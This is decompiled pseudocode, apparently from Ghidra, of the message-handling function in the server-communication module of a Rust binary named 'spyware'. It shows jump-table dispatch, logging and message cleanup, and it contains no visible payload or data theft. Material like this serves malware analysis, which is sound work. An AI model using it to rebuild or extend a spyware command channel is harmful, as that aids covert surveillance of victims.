void _ZN7spyware13communication6server14handle_message17h02435bd595e8370dE(ulong *param_1)

{
  long lVar1;
  undefined **local_338;
  undefined8 local_330;
  undefined8 local_328;
  undefined8 local_320;
  undefined8 uStack_318;
  undefined *local_300;
  undefined8 local_2f8;
  undefined *local_2f0;
  undefined8 local_2e8;
  undefined8 local_2e0;
  
  if ((*param_1 ^ 0x8000000000000000) < 9) {
                    /* WARNING: Could not recover jumptable at 0x0014c5ff. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)(&DAT_00111d94 + *(int *)(&DAT_00111d94 + *param_1 * 4)))();
    return;
  }
  lVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (lVar1 != 0) {
    local_338 = &PTR_DAT_001b8b10;
    local_330 = 1;
    local_328 = 8;
    local_320 = 0;
    uStack_318 = 0;
    local_2e0 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                          (&PTR_DAT_001b8b98);
    local_300 = &DAT_001120dc;
    local_2f8 = 0x1e;
    local_2f0 = &DAT_001120dc;
    local_2e8 = 0x1e;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_338,1,&local_300);
  }
  if (8 < (*param_1 ^ 0x8000000000000000)) {
    _ZN4core3ptr62drop_in_place_LT_spyware__communication__messages__Message_GT_17hdefc99125fc89861E
              (param_1);
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x0014c9ef. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(&DAT_00111e24 + *(int *)(&DAT_00111e24 + *param_1 * 4)))();
  return;
}